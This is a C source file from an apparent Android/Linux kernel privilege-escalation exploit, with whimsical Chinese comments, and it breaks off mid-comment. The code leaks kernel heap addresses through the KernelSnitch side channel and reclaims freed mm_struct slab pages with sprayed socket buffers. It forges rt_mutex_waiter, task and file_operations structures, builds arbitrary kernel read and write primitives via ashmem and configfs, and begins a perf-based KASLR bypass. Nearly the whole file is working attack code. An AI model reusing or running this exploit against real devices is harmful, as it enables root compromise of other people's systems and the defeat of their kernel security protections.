/* ==========================================================================
 * 【魔法书包工坊】—— 把一个我们能控制内容的"书包"(内核页)造出来
 * ==========================================================================
 * 后面每一关都要往书包里塞假道具：
 *   第 1 关: 假排班表(伪造 rt_mutex_waiter 图，页内自包含)
 *   第 2 关: 假钥匙牌(伪造 file_operations 表)
 *   第 3 关: 假水管(伪造 pipe_buffer)
 *
 * 造书包的原理(占座大法)：
 *   1. 开一堆小朋友进程(clone)，每人占一个 mm_struct 座位(slab 对象)
 *   2. KernelSnitch 侧信道数座位，把"哪几个座位连号"摸清楚
 *   3. 让目标座位的小朋友退园(kill)，座位空出来
 *   4. 赶紧用内核网络包(skb, 32KB order-3)把书包内容喷进刚空出的座位
 *      —— 书包(页)从此归我们写字！
 * ========================================================================== */

#include "common.h"
#include "kernelsnitch/kernelsnitch.h"
#include <linux/perf_event.h>

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;

static int get_ksnitch_collisions(void) {
  const char *arg = getenv("KSNITCH_COLLISIONS");
  if (arg) {
    int val = atoi(arg);
    if (val > 0) return val;
  }
  return KSNITCH_COLLISIONS;
}
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, get_ksnitch_collisions(), 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

/* RT-variant: set SCHED_FIFO with given priority (1..99).
 * Used by slide consumer experiment to test whether a real RT priority
 * change is what triggers rt_mutex_adjust_prio_chain on shennong 6.1. */
long sched_setattr_tid_rt(int tid, int rt_priority) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_FIFO;
  attr.sched_priority = rt_priority;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

/* 【往书包里装道具】按 payload_mode 装不同关卡的道具：
 *   PAGE_PAYLOAD_SLIDE(第 1 关): 假排班表 —— 伪造 rt_mutex_waiter 全家桶
 *   PAGE_PAYLOAD_FOPS (第 2 关): 假钥匙牌 —— 伪造 file_operations 表
 * 书包是 32KB 大块，同一份道具在每 8KB(chunk)重复印一遍，
 * 提高喷中率(不确定学校会发哪个 chunk)。 */
int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    /* 【第 1 关专用: 全图页内自包含】运行时线性映射基址是随机化的
     * (真书包地址 0xffffff88xxxxxxxx，编译期常量却假设 0xffffff80xxx)，
     * 任何编译期算出的 SLIDE_* 地址在运行时都是"查无此房"，一碰就全园
     * 警报(panic)。所以这里把整张假排班表的指针全部改指书包内部：
     * 假 task 指书包里的假 task，假锁指书包里的假锁，邻居也是书包内。 */
    uintptr_t fake_right_zone = payload_base + RIGHT_OFF;
    uintptr_t fake_left_zone = payload_base + LEFT_OFF;
    write_pc = fake_right_zone;
    write_right = 0;
    write_left = 0;
    waiter_task = fake_task;
    task_group = fake_task;
    pi_top_task = fake_task;
    fake_parent = fake_right_zone;
    fake_right = fake_left_zone;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    /* 【假锁的排队名单】waiters 红黑树指到书包里的 fake_w0。园长查
     * "谁在排队"时(leftmost->task)，第一个读的就是这里 —— 必须落在
     * 书包内，否则空指针警报(反汇编已验证无 NULL 检查)。 */
    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      /* owner==NULL branch of rt_mutex_adjust_prio_chain does
       * wake_up_state(lock->waiters.rb_leftmost->task, ...) without a
       * leftmost NULL check (verified by disasm @ adjust_prio_chain+0x820:
       * cbz x8 skips only the lock-check, then ldr x0,[x8,#0x30] panics).
       * Point waiters tree at fake_w0 so leftmost derefs stay in our page. */
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    /* 【假标签树根必须染黑】parent_color=0 表示"无父 + 黑色"。
     * 树根若是红色：园长把红色鬼标签补挂到它下面时会触发"红红冲突"，
     * 要找祖父节点核对 —— 树根没有祖父(空指针) -> 全园警报。
     * 树根染黑后，红色子标签怎么挂都合法，绝不触发旋转。 */
    put64(p, W0_OFF + 0x00, 0);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
    }
  }
  return 1;
}

/* 【造书包主流程】占座 -> 数座位 -> 腾座位 -> 喷书包。
 * 任何一步失败(座位没数清/没喷中)都返回 0，调用方换一轮重来。 */
uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, get_ksnitch_collisions(), 0, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_RECLAIM_SIZE; /* 0x8e80: matches SKB_DATA_DELTA=-0xe80 layout; SKB_SEND_SIZE(0x10000) misplaces fake_lock */

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

/* --------------------------------------------------------------------------
 * KASLR 泄漏(perf 路线):perf_event_paranoid == -1 时可用。
 *
 * 原理:给自己挂一个 software cpu-clock 事件(exclude_user=1),再疯狂跑
 * getpid()。定时器只在内核态打断我们 → 每个样本的 callchain 必然是
 * [IP] + invoke_syscall 返回点 + el0_svc_common 返回点 + do_el0_svc 返回点
 * + el0_svc 返回点(全部来自本内核镜像的静态反汇编,锚点表见下)。
 * 帧值 = 镜像基址 + slide + 锚点RVA(精确相等,不是近似),所以每次命中
 * 都直接解出 slide。帧本身也都是别的函数的返回点,不可能与锚点地址
 * 巧合相等 → 伪阳性为零;仍要求 >=2 个不同锚点同时命中以双保险。
 * -------------------------------------------------------------------------- */

struct perf_anchor {
  uint64_t rva;
  const char *func;
};

/* shennong 6.1.138 镜像中以下函数的全部 BL/BLR 返回点
